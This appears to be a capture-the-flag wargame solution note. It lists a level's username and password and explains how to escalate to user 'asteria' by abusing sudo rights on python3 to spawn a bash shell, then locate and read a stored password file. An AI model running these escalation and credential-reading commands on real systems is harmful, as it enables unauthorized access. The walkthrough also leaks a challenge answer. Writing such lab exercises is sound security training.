# username
asia
# password
djqWtkLisbQlrGtLYHCv
# mission contents
The user asteria is teaching us to program in python.
# method of solve
We are given `sudo` permissions as the `asteria` user with the `/usr/bin/python3` binary. We can use the oft-used Python shell stabilization technique to open a shell as asteria
```
sudo -l
sudo -u asteria python3 -c 'import pty;pty.spawn("/bin/bash")'
find / -group asteria 2>/dev/null | grep -v proc
cat /usr/share/doc/asteria_pass.txt
```
